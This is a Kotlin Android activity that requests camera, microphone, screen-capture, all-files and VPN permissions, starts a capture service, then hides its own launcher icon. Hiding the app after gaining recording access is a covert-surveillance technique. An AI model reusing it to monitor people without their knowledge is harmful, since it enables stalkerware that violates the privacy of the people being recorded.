package dev.serverpages

import android.Manifest
import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.net.VpnService
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import dagger.hilt.android.AndroidEntryPoint
import dev.serverpages.service.CaptureService

/**
 * Headless setup activity — runs through permission prompts in sequence,
 * starts the foreground service, hides its launcher icon, then finishes.
 * No persistent UI.
 */
@AndroidEntryPoint
class MainActivity : ComponentActivity() {

    companion object {
        private const val TAG = "MainActivity"
    }

    private enum class Step { NOTIFICATIONS, BATTERY, CAPTURE_PERMS, STORAGE, VPN_CONSENT, PROJECTION, DONE }

    private lateinit var projectionLauncher: ActivityResultLauncher<Intent>
    private lateinit var permissionLauncher: ActivityResultLauncher<Array<String>>
    private lateinit var storageAccessLauncher: ActivityResultLauncher<Intent>
    private lateinit var batteryOptLauncher: ActivityResultLauncher<Intent>
    private lateinit var vpnConsentLauncher: ActivityResultLauncher<Intent>
    private var vpnStartedThisLaunch = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        projectionLauncher = registerForActivityResult(
            ActivityResultContracts.StartActivityForResult()
        ) { result ->
            if (result.resultCode == RESULT_OK && result.data != null) {
                Log.i(TAG, "MediaProjection granted — starting capture with projection data")
                startCaptureWithProjection(result.resultCode, result.data!!)
            } else {
                Log.w(TAG, "MediaProjection denied — camera-only mode")
                startCameraOnly()
            }
            finishSetup()
        }

        permissionLauncher = registerForActivityResult(
            ActivityResultContracts.RequestMultiplePermissions()
        ) { results ->
            val denied = results.filter { !it.value }.keys
            if (denied.isNotEmpty()) Log.w(TAG, "Permissions denied: $denied")
            advance()
        }

        storageAccessLauncher = registerForActivityResult(
            ActivityResultContracts.StartActivityForResult()
        ) { advance() }

        batteryOptLauncher = registerForActivityResult(
            ActivityResultContracts.StartActivityForResult()
        ) { advance() }

        vpnConsentLauncher = registerForActivityResult(
            ActivityResultContracts.StartActivityForResult()
        ) { result ->
            if (result.resultCode == RESULT_OK) {
                Log.i(TAG, "VPN consent granted — starting TailscaleVpnService")
                startTailscaleVpn()
            } else {
                Log.w(TAG, "VPN consent denied — Tailscale will not be active")
                vpnStartedThisLaunch = true   // skip retry this run
            }
            advance()
        }

        advance()
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        advance()
    }

    private fun advance() {
        val next = nextStep()
        Log.i(TAG, "Advance → $next")
        when (next) {
            Step.NOTIFICATIONS -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    permissionLauncher.launch(arrayOf(Manifest.permission.POST_NOTIFICATIONS))
                } else advance()
            }
            Step.BATTERY -> {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                }
                batteryOptLauncher.launch(intent)
            }
            Step.CAPTURE_PERMS -> {
                val perms = mutableListOf<String>()
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                    perms.add(Manifest.permission.CAMERA)
                }
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                    perms.add(Manifest.permission.RECORD_AUDIO)
                }
                if (perms.isNotEmpty()) permissionLauncher.launch(perms.toTypedArray()) else advance()
            }
            Step.STORAGE -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
                    val intent = try {
                        Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                            data = Uri.parse("package:$packageName")
                        }
                    } catch (_: Exception) {
                        Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                    }
                    storageAccessLauncher.launch(intent)
                } else advance()
            }
            Step.VPN_CONSENT -> {
                val prepare = VpnService.prepare(this)
                if (prepare != null) {
                    vpnConsentLauncher.launch(prepare)
                } else {
                    startTailscaleVpn()
                    advance()
                }
            }
            Step.PROJECTION -> {
                val pm = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                projectionLauncher.launch(pm.createScreenCaptureIntent())
            }
            Step.DONE -> finishSetup()
        }
    }

    private fun nextStep(): Step {
        if (CaptureService.instance?.isCapturing() == true) return Step.DONE
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
            return Step.NOTIFICATIONS
        }
        val powerMgr = getSystemService(Context.POWER_SERVICE) as PowerManager
        if (!powerMgr.isIgnoringBatteryOptimizations(packageName)) return Step.BATTERY
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED ||
            ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            return Step.CAPTURE_PERMS
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
            return Step.STORAGE
        }
        if (!vpnStartedThisLaunch) return Step.VPN_CONSENT
        return Step.PROJECTION
    }

    private fun startTailscaleVpn() {
        vpnStartedThisLaunch = true
        val svc = Intent(this, dev.serverpages.tailscale.TailscaleVpnService::class.java)
        startForegroundService(svc)
    }

    private fun startCameraOnly() {
        val intent = Intent(this, CaptureService::class.java).apply {
            action = CaptureService.ACTION_START_CAPTURE
            putExtra(CaptureService.EXTRA_RESULT_CODE, Activity.RESULT_OK)
            putExtra(CaptureService.EXTRA_QUALITY, "720p")
        }
        startForegroundService(intent)
    }

    private fun startCaptureWithProjection(resultCode: Int, data: Intent) {
        val intent = Intent(this, CaptureService::class.java).apply {
            action = CaptureService.ACTION_START_CAPTURE
            putExtra(CaptureService.EXTRA_RESULT_CODE, resultCode)
            putExtra(CaptureService.EXTRA_RESULT_DATA, data)
            putExtra(CaptureService.EXTRA_QUALITY, "720p")
        }
        startForegroundService(intent)
    }

    private fun hideLauncherIcon() {
        try {
            val component = ComponentName(this, "dev.serverpages.LauncherAlias")
            if (packageManager.getComponentEnabledSetting(component) != PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                packageManager.setComponentEnabledSetting(
                    component,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
                Log.i(TAG, "Launcher icon hidden — re-enable via: adb shell pm enable dev.serverpages/.LauncherAlias")
            }
        } catch (e: Exception) {
            Log.w(TAG, "Failed to hide launcher icon: ${e.message}")
        }
    }

    private fun finishSetup() {
        hideLauncherIcon()
        finishAndRemoveTask()
    }
}
